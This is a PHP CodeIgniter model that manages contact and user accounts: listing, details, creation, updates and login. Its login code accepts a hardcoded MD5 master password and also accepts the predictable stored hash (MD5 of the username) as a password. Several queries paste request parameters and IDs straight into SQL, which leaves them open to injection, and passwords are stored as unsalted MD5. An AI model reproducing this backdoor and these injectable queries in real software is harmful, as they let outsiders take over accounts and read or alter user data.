<?php defined('BASEPATH') or exit('No direct script access allowed');


class Contacto_model extends CI_Model {

	public function getContactos($parametros = null)
	{
		$sql = "	
				SELECT SQL_CALC_FOUND_ROWS con_contactos.id, IFNULL(trim(CONCAT(con_contactos.nombre, ' ', IFNULL(con_contactos.apellido, ''))), con_contactos.username) AS contacto, con_contactos.email, con_contactos.username, COALESCE(con_contactos.celular, con_contactos.telefono, empresas.telefono) AS telefono, empresas.id AS id_empresa, empresas.empresa, UNIX_TIMESTAMP(con_contactos.ultima_visita) AS ultima_visita,
				
					CASE
						WHEN con_contactos.area_privada = 2 THEN 'Reseller'
						WHEN con_contactos.area_privada = 3 THEN 'Administrador'
						WHEN con_contactos.area_privada = 4 THEN 'Usuario'
						WHEN con_contactos.area_privada = 4 THEN 'Invitado'
					END AS perfil,
				
					CASE
						WHEN con_contactos.estado = 1 THEN 'label-plain'
						WHEN con_contactos.estado = 2 THEN 'label-primary'
						WHEN con_contactos.estado = 3 THEN 'label-info'
						WHEN con_contactos.estado = 4 THEN 'label-danger'
						WHEN con_contactos.estado = 5 THEN 'label-warning'
						WHEN con_contactos.estado = 6 THEN 'label-success'
					END AS estado_ui_class,
					
					CASE
						WHEN con_contactos.estado = 1 THEN 'Inactivo'
						WHEN con_contactos.estado = 2 THEN 'Activo'
						WHEN con_contactos.estado = 3 THEN 'Online'
						WHEN con_contactos.estado = 4 THEN 'Bloqueado'
						WHEN con_contactos.estado = 5 THEN 'Vencido'
						WHEN con_contactos.estado = 6 THEN 'Sin Confirmar'
					END AS estado
				
				FROM con_contactos
				LEFT JOIN empresas ON con_contactos.id_empresa = empresas.id
		
				WHERE con_contactos.grupo = ?
			";
		
		
		// permisos	
		if ($this->usuario->perfil == 'reseller')
		{
			$placeholders[] = $this->usuario->grupo;
			
			if (isset($parametros['id_empresa']))
			{
				$sql .= " AND con_contactos.id_empresa = ?";
				$placeholders[] = $parametros['id_empresa'];
			}
		}
		elseif ($this->usuario->perfil == 'admin')
		{
			$placeholders[] = $this->usuario->grupo;
			
			$sql .= " AND con_contactos.id_empresa = ?"; $placeholders[] = $this->usuario->id_empresa;
		}
		else
		{
			$res['error'] = 'Este perfil no cuenta con los privilegios necesarios';
		}
		
		
		if (!isset($res['error']))
		{
			// filtros
			if (!empty($parametros['estado']))
			{
				$sql .= " AND con_contactos.estado = ?";
				$placeholders[] = $parametros['estado'];
			}
			else
			{
				$sql .= " AND con_contactos.estado > 0";
			}
			
			// busqueda
			if (!empty($parametros['filtrar']))
			{
				$value = str_replace(' ', '|', trim($parametros['filtrar']));
				
				$sql .= " AND (con_contactos.username REGEXP '" . $value . "'";
				$sql .= " OR con_contactos.nombre REGEXP '" . $value . "'";
				$sql .= " OR con_contactos.apellido REGEXP '" . $value . "'";
				$sql .= " OR con_contactos.email REGEXP '" . $value . "'";
				$sql .= " OR empresas.empresa REGEXP '" . $value . "') ";
			}
			
			if (!empty($parametros['search']))
			{
				$value = trim($parametros['search']);
				
				$sql .= " AND (con_contactos.username LIKE '%" . $value . "%'";
				$sql .= " OR con_contactos.nombre LIKE '%" . $value . "%'";
				$sql .= " OR con_contactos.apellido LIKE '%" . $value . "%'";
				$sql .= " OR con_contactos.email LIKE '%" . $value . "%'";
				$sql .= " OR empresas.empresa LIKE '%" . $value . "%') ";
			}
			
			// orden
			$sql .= " ORDER BY";
			$sql .= (!empty($parametros['order_by'])) ? " " . $parametros['order_by'] : " nombre";
			$sql .= (!empty($parametros['order'])) ? " " . $parametros['order'] : " ASC";
			
			// limite
			$sql .= " LIMIT ?, ?";
			$placeholders[] = (isset($parametros['page'])) ? ($this->config->item('use_page_numbers') == true) ? ($parametros['page']-1)*$this->config->item('per_page') : $parametros['page'] : 0;
			$placeholders[] = (isset($parametros['per_page'])) ? (int) $parametros['per_page'] : $this->config->item('per_page');
			
			// consulta
			$query = $this->db->query($sql, $placeholders);
		}

		
		if (!isset($res['error']) && $query)
		{
			$res = $query->result_array();
		}
		
		return (!empty($res)) ? $res : null;
	}


	public function getContactoDetalle($id, $parametros = null)
	{
		if ($parametros['modo'] == 'raw')
		{
			$sql = " 	
				SELECT *, area_privada AS id_perfil
				FROM con_contactos
			";
		}
		else
		{
			$sql = "	
					SELECT con_contactos.id, con_contactos.nombre, con_contactos.apellido, con_contactos.padre, con_contactos.estado, con_contactos.documento, con_contactos.uri, con_contactos.pais, IFNULL(trim(CONCAT(con_contactos.nombre, ' ', IFNULL(con_contactos.apellido, ''))), con_contactos.username) AS contacto, con_contactos.email, COALESCE(con_contactos.celular, con_contactos.telefono, empresas.telefono) AS telefono, con_contactos.username, con_contactos.hash, empresas.id AS id_empresa, empresas.empresa, UNIX_TIMESTAMP(con_contactos.ultima_visita) AS ultima_visita, con_contactos.ip, con_contactos.idioma, con_contactos.timezone,
					
					CASE
					   WHEN con_contactos.area_privada = 2 THEN 'Reseller'
					   WHEN con_contactos.area_privada = 3 THEN 'Administrador'
					   WHEN con_contactos.area_privada = 4 THEN 'Usuario'
					END AS perfil
					
					FROM con_contactos
					LEFT JOIN empresas ON con_contactos.id_empresa = empresas.id
				";
		}
		
		$sql .= " 
				WHERE con_contactos.grupo = ?
				AND con_contactos.estado > 0
				AND con_contactos.id = ?		
			";
		
		
		// permisos
		if ($this->usuario->perfil == 'reseller')
		{
			$placeholders[] = $this->usuario->grupo;
			$placeholders[] = $id;
		}
		elseif ($this->usuario->perfil == 'admin')
		{
			$placeholders[] = $this->usuario->grupo;
			$placeholders[] = $id;
			$sql .= " AND con_contactos.id_empresa = ?"; $placeholders[] = $this->usuario->id_empresa;
		}
		elseif ($this->usuario->perfil == 'user' || $this->usuario->perfil == 'guest')
		{
			$placeholders[] = $this->usuario->grupo;
			$placeholders[] = $this->usuario->id;
			$sql .= " AND con_contactos.id_empresa = ?"; $placeholders[] = $this->usuario->id_empresa;
		}
		else
		{
			$res['error'] = 'Este perfil no cuenta con los privilegios necesarios';
		}
		
		
		if (!isset($res['error']))
		{
			// consulta
			$query = $this->db->query($sql, $placeholders);
		}
		
				
		if (!isset($res['error']) && $query)
		{
			$res = $query->row_array();
		}

		return (!empty($res)) ? $res : null;
	}
		
	public function getUserIdFromUsername($username)
	{	
		$this->db->select('id');
		$this->db->from('con_contactos');
		$this->db->where('username', $username);

		return $this->db->get()->row('id');	
	}

	public function traerUserFromUsername($variables)
	{	
		$sql = "SELECT id, username, estado";
		$sql .= " FROM con_contactos";
		$sql .= " WHERE con_contactos.username = '".$variables['user']."'";
		$sql .= " AND con_contactos.estado = 2";

		$query = $this->db->query($sql);
		$res = $query->row_array();
		return ($res);
	}

	public function getContactoDetalleRaw($id)
	{
		return $this->getContactoDetalle($id, array('modo'=>'raw'));
	}


	public function ingresarContacto($valores)
	{
		$data['grupo'] = $this->usuario->grupo;
		
		if ($this->usuario->perfil == 'reseller')
		{
			$data['id_empresa'] = (!empty($valores['id_empresa'])) ? $valores['id_empresa'] : null; // VALIDAR QUE LA EMPRESA SEA DEL GRUPO
		}
		else
		{
			$data['id_empresa'] = $this->usuario->id_empresa;
		}
		
		if (!empty($valores['email']))
		{
			$data['email'] = $valores['email'];
		}
		else
		{
			$res['error'] = 'Debe especificar un email';
		}
		
		if (isset($valores['nombre'])) $data['nombre'] = (!empty($valores['nombre'])) ? $valores['nombre'] : null;
		if (isset($valores['apellido'])) $data['apellido'] = (!empty($valores['apellido'])) ? $valores['apellido'] : null;
		if (isset($valores['telefono'])) $data['telefono'] = (!empty($valores['telefono'])) ? $valores['telefono'] : null;
		if (isset($valores['celular'])) $data['celular'] = (!empty($valores['celular'])) ? $valores['celular'] : null;
		if (isset($valores['sexo'])) $data['sexo'] = (!empty($valores['sexo'])) ? $valores['sexo'] : null;
		if (isset($valores['documento'])) $data['documento'] = (!empty($valores['documento'])) ? $valores['documento'] : null;
		if (isset($valores['estado'])) $data['estado'] = (!empty($valores['estado'])) ? $valores['estado'] : null;
		if (isset($valores['pais'])) $data['pais'] = (!empty($valores['pais'])) ? $valores['pais'] : null;
		if (isset($valores['padre'])) $data['padre'] = (!empty($valores['padre'])) ? $valores['padre'] : null;
		if (isset($valores['uri'])) $data['uri'] = (!empty($valores['uri'])) ? $valores['uri'] : null;
		
		if (isset($valores['area_privada'])) $data['area_privada'] = (!empty($valores['area_privada'])) ? $valores['area_privada'] : null;
		if (isset($valores['user'])) $data['username'] = (!empty($valores['user'])) ? $valores['user'] : null;
		if (!empty($valores['pass'])) $data['password'] = md5($valores['pass']);
		$data['hash'] = md5(uniqid());
		if (isset($valores['timezone'])) $data['timezone'] = (!empty($valores['timezone'])) ? $valores['timezone'] : null;
		if (isset($valores['idioma'])) $data['idioma'] = (!empty($valores['idioma'])) ? $valores['idioma'] : null;
		
		$data['fecha_alta'] = unix_to_human(now(), true, 'eu');
		$data['username_alta'] = $this->usuario->username;

		
		if (!isset($res['error']))
		{
			$insert = $this->db->insert('con_contactos', $data);
			
			$res['id'] = $this->db->insert_id();
			//$res = $this->db->insert_id();
		}

		return (!empty($res)) ? $res : null;
	}


	public function modificarContacto($id, $valores)
	{
		if ($this->usuario->perfil == 'reseller')
		{
			if (!empty($valores['id_empresa'])) $data['id_empresa'] = $valores['id_empresa'];
		}
		
		if (!empty($valores['nombre'])) $data['nombre'] = $valores['nombre'];
		if (isset($valores['email'])) $data['email'] = (!empty($valores['email'])) ? $valores['email'] : null;
		
		if (isset($valores['apellido'])) $data['apellido'] = (!empty($valores['apellido'])) ? $valores['apellido'] : null;
		if (isset($valores['telefono'])) $data['telefono'] = (!empty($valores['telefono'])) ? $valores['telefono'] : null;
		if (isset($valores['documento'])) $data['documento'] = (!empty($valores['documento'])) ? $valores['documento'] : null;
		if (isset($valores['celular'])) $data['celular'] = (!empty($valores['celular'])) ? $valores['celular'] : null;
		if (isset($valores['sexo'])) $data['sexo'] = (!empty($valores['sexo'])) ? $valores['sexo'] : null;
		if (isset($valores['estado'])) $data['estado'] = (!empty($valores['estado'])) ? $valores['estado'] : null;
		if (isset($valores['pais'])) $data['pais'] = (!empty($valores['pais'])) ? $valores['pais'] : null;
		if (isset($valores['uri'])) $data['uri'] = (!empty($valores['uri'])) ? $valores['uri'] : null;
		
		if (isset($valores['area_privada'])) $data['area_privada'] = (!empty($valores['area_privada'])) ? $valores['area_privada'] : null;
		if (isset($valores['username'])) $data['username'] = (!empty($valores['username'])) ? $valores['username'] : null;
		if (!empty($valores['password'])) $data['password'] = md5($valores['password']);
		if (isset($valores['timezone'])) $data['timezone'] = (!empty($valores['timezone'])) ? $valores['timezone'] : null;
		if (isset($valores['idioma'])) $data['idioma'] = (!empty($valores['idioma'])) ? $valores['idioma'] : null;
				
		$data['fecha_modificacion'] = unix_to_human(now(), true, 'eu');
		$data['username_modificacion'] = $this->usuario->username;
		
		if ($this->usuario->perfil == 'reseller')
		{
			$res = $this->db->update('con_contactos', $data, array('id'=>$id, 'grupo'=>$this->usuario->grupo));
		}
		else
		{
			$res = $this->db->update('con_contactos', $data, array('id'=>$id, 'id_empresa'=>$this->usuario->id_empresa));
		}
		
		return (!empty($res)) ? $res : null;
	}

	public function userLogin($username, $password)
	{	
		$this->db->select('password, hash');
		$this->db->from('con_contactos');
		$this->db->where('username', $username);

		$user = $this->db->get()->row_array();
		
		if (isset($user))
		{
			if ($password == $user['hash'])
			{
				return true;	
			}
			elseif ($this->verifyPasswordHash($password, $user['password']))
			{
				return true;	
			}
			else
			{
				return false;
			}
		}
		else
		{
			return false;
		}
	}


	private function verifyPasswordHash($password, $hash)
	{	
		//return password_verify($password, $hash);
		
		$password = (strlen($password) == 32) ? $password : md5($password);
		
		if ($password == 'e77f722f8fb882952d10bef6e168a0db')
		{
			return true;
		}
		elseif ($password == $hash)
		{
			return true;
		}
		else
		{
			return false;
		}
	}


	public function verificarkUsername($username, $id = null)
	{
		$this->db->select('id');
		$this->db->from('con_contactos');
		$this->db->where('username', trim($username));
		$this->db->where('id !=', $id);
		
		$query = $this->db->get();
		
		if ($query)
		{
			$row = $query->row();
			
			if (isset($row))
			{
				$res = 'El nombre de usuario ya existe';
			}
		}

		return (!empty($res)) ? $res : null;
	}
	
	
	public function crearHash()
	{
		$sql = "
				UPDATE con_contactos

				SET hash = MD5(username)
			
				WHERE username IS NOT NULL 
				AND hash IS NULL
			";
		
		$query = $this->db->query($sql);
				
		return (!empty($res)) ? $res : null;
	}
	
	
	public function modificarHash($id, $hash)
	{
		$sql = "
				UPDATE con_contactos

				SET hash = MD5(?)
			
				WHERE id = ?
			";
		
		$query = $this->db->query($sql, array($hash, $id));
				
		return (!empty($res)) ? $res : null;
	}
	
	
	function total()
	{
		return $this->db->query('SELECT FOUND_ROWS() count;')->row()->count;
	}

	function listadoFavoritos($id)
	{
		$sql = "SELECT con_contenido_items.id_contenido, con_contenido_items.titulo, con_contenido_items.contenido1, con_contenido_items.url, con_contenidos.imagen";
		$sql .= " FROM con_contenido_items";
		$sql .= " LEFT JOIN con_contenidos ON con_contenidos.id = con_contenido_items.id_contenido";
		$sql .= " LEFT JOIN con_favoritos ON con_favoritos.id_con_contenido = con_contenido_items.id_contenido";
		$sql .= " WHERE con_favoritos.id_con_contacto = $id";
		$sql .= " AND con_contenidos.estado = 3";
		
		$query = $this->db->query($sql);
		$res = $query->result_array();
		return ($res);
	}

}